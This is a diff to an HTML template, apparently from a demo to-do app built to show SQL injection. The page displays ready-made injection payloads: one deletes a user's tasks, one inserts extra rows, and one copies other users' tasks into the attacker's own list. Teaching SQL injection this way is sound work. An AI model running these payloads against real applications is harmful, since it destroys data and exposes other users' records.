@@ -13,18 +13,20 @@
     <form action="{{endpoint}}/reset-user1" method="post">
       <button type="submit" class="btn btn-lg btn-primary">Reset user1</button>
     </form>
+    
     <br>
     <strong>Destructive injection</strong>
     <br>
-    <code>Say goodbye, user1', 0, '1'); DELETE FROM todo WHERE user_id = '1'; INSERT INTO todo (task_description, task_complete, user_id) VALUES ('</code>
+    <code>Say goodbye, user1', 0, '1'); DELETE FROM todo WHERE user_id = '1'; INSERT INTO todo (task_description, task_complete, user_id) VALUES ('All gone</code>
+    
     <br>
     <strong>Nondestructive injection</strong>
     <br>
-    <code>A first task', 0, '1'); INSERT INTO todo (task_description, task_complete, user_id) VALUES ('A second task', 0, '1'); INSERT INTO todo (task_description, task_complete, user_id) VALUES ('A final task</code>
+    <code>A first task', 0, '{{user_id}}'); INSERT INTO todo (task_description, task_complete, user_id) VALUES ('A second task', 0, '{{user_id}}'); INSERT INTO todo (task_description, task_complete, user_id) VALUES ('A final task</code>
+    
     <br>
     <strong>Access other users' data</strong>
     <br>
-    <code>vvvvvStart of other user tasksvvvvv', 0, '1'); INSERT INTO todo (task_description, task_complete, user_id) SELECT task_description, task_complete, '1' FROM todo WHERE user_id != '1'; INSERT INTO todo (task_description, task_complete, user_id) VALUES ('^^^^^End of other user tasks^^^^^</code>
-    
+    <code>vvvvvStart of other user tasksvvvvv', 0, '{{user_id}}'); INSERT INTO todo (task_description, task_complete, user_id) SELECT task_description, task_complete, '{{user_id}}' FROM todo WHERE user_id != '{{user_id}}'; INSERT INTO todo (task_description, task_complete, user_id) VALUES ('^^^^^End of other user tasks^^^^^</code>
   </div>
 </div>
